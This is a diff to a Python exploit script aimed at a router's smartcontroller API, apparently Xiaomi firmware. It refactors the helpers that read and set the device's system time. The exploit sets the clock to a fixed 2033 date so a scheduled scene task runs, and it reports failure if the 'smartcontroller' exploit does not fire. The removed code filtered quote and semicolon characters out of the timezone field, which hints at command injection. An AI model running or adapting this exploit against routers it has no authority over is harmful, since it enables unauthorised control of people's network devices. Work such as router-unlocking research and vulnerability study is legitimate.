@@ -228,42 +228,6 @@ def exec_cmd(command, fn = '/tmp/e', run_as_sh = True):
         exec_tiny_cmd(f"chmod +x {fn}")
         exec_tiny_cmd(f"sh {fn}")
 
-def get_dev_systime():
-    # http://192.168.31.1/cgi-bin/luci/;stok=14b996378966455753104d187c1150b4/api/misystem/sys_time
-    # response: {"time":{"min":32,"day":4,"index":0,"month":10,"year":2023,"sec":7,"hour":6,"timezone":"XXX"},"code":0}
-    res = requests.get(gw.apiurl + 'misystem/sys_time')
-    try:
-        dres = json.loads(res.text)
-        code = dres['code']
-    except Exception:
-        raise ExploitError(f'Error on parse response for command "sys_time" => {res.text}')
-    if code != 0:
-        raise ExploitError(f'Error on get sys_time => {res.text}')
-    return dres['time']
-
-def set_dev_systime(dst, year = 0, month = 0, day = 0, hour = 0, min = 0, sec = 0, timezone = ""):
-    if dst:
-        year     = dst['year']
-        month    = dst['month']
-        day      = dst['day']
-        hour     = dst['hour']
-        min      = dst['min']
-        sec      = dst['sec']
-        timezone = dst['timezone']
-    params = {
-                'time': f"{year}-{month}-{day} {hour}:{min}:{sec}",
-                'timezone': timezone
-             }
-    res = requests.get(gw.apiurl + 'misystem/set_sys_time', params = params)
-    try:
-        dres = json.loads(res.text)
-        code = dres['code']
-    except Exception:
-        raise ExploitError(f'Error on parse response for command "set_sys_time" => {res.text}')
-    if code != 0:
-        raise ExploitError(f'Error on exec command "set_sys_time" => {res}')
-    return res.text
-
 
 # Test smartcontroller interface
 res = get_all_scenes()
@@ -282,14 +246,11 @@ else:
         die(f'Smartcontroller return Error: {res}')
 
 # get device orig system time
-dst = get_dev_systime()
-if 'timezone' in dst:
-    if "'" in dst['timezone'] or ";" in dst['timezone']:
-        dst['timezone'] = "GMT0"
+dst = gw.get_device_systime()
 
 print('Enable smartcontroller scene executor ...')
 # echo "OK" > /tmp/ntp.status
-res = set_dev_systime(dst)
+gw.set_device_systime(dst, wait = True)
 
 #print('Change date ...')
 #time.sleep(20)
@@ -306,13 +267,15 @@ while datetime.datetime.now() - start_time <= datetime.timedelta(seconds = 32):
         #print(res)
     except Exception:
         try:
-            set_dev_systime(dst)
+            gw.set_device_systime(dst, wait = False)
+            time.sleep(1)
             reset_smart_task()
         except Exception:
             pass
         print('============ smartcontroller failed ============')
+        time.sleep(2)
         raise
-    dxt = get_dev_systime()
+    dxt = gw.get_device_systime()
     if dxt['year'] == 2033 and dxt['month'] == 1 and dxt['day'] == 2:
         if dxt['hour'] == 3 and dxt['min'] == 4:
             sc_activated = True
@@ -320,8 +283,9 @@ while datetime.datetime.now() - start_time <= datetime.timedelta(seconds = 32):
 
 # restore orig system time
 time.sleep(1)
-set_dev_systime(dst)
+gw.set_device_systime(dst, wait = False)
 if not sc_activated:
+    time.sleep(1)
     reset_smart_task()
     die('Exploit "smartcontroller" not working!!!')
 
